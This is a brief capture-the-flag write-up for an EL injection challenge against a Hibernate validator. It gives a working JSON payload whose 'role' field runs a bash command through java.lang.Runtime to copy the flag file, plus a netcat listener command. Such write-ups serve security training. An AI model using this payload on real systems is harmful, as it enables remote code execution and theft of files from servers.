## EL Injection Blind RCE Challenge
## Download the source code and look into how the Hibernate validator is being used

## Solution
1. Send the POST request to /userRegistration endpoint with the required value in body to create an account
2. Start nc on port 4444 by running `nc -nlvp 4444`
3. Send the below payload in the body to retrieve the flag
``` 
{
"userId":"1",
"firstName":"test",
"lastName":"test",
"email":"test",
"password":"test",
"role":"${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('bash -c cat$IFS/flag$IFS>/var/www/flag.txt')}"

}
```
